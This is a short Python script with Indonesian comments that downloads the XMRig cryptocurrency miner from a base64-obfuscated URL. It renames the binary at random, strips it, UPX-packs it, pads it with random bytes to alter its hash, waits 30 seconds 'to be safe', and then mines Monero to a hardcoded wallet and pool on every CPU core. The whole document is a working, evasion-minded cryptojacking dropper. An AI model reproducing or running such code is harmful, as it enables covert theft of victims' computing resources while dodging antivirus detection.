import os
import base64
import random
import string
import time

def random_name():
    return ''.join(random.choices(string.ascii_lowercase, k=8))

# URL XMRig (base64 encoded)
xmrig_url = base64.b64decode("aHR0cHM6Ly9naXRsYWIuY29tL0hnb0x1aXMvc3BtMTc3Ly0vcmF3L21haW4veG1yaWctNi4xMC4wLWxpbnV4LXg2NC50YXIuZ3o=").decode()
archive_name = "xmrig.tar.gz"
extract_dir = "xmrig-6.10.0"
final_name = random_name()

# Download dan ekstrak
os.system(f"wget {xmrig_url} -O {archive_name}")
os.system(f"tar -xf {archive_name}")

# Pindah ke direktori ekstraksi dan proses binary
os.system(f"cd {extract_dir} && mv xmrig ../{final_name}")
os.system(f"strip {final_name}")
os.system(f"upx --brute {final_name}")
os.system(f"dd if=/dev/urandom bs=1 count=1024 >> {final_name}")
os.system(f"chmod +x {final_name}")

print("[INFO] Sleeping 30 detik dulu biar aman...")
time.sleep(30)

# Konfigurasi mining
algo = "rx/0"
pool = "pool.hashvault.pro:443"
wallet = "872K52Fn7tP7AazRLSQ1KzFJhxC3Ph1RaVM2zuW2Ag9FfmBrBFxZKHmiJkdntsd6Mg69VQZXgXbtXfNztqdZ8YdZ88VNLod.org"

cmd = f"./{final_name} -a {algo} --url {pool} --tls --user {wallet} --cpu {os.cpu_count()}"
print(f"[INFO] Running miner:\n{cmd}\n")
os.system(cmd)
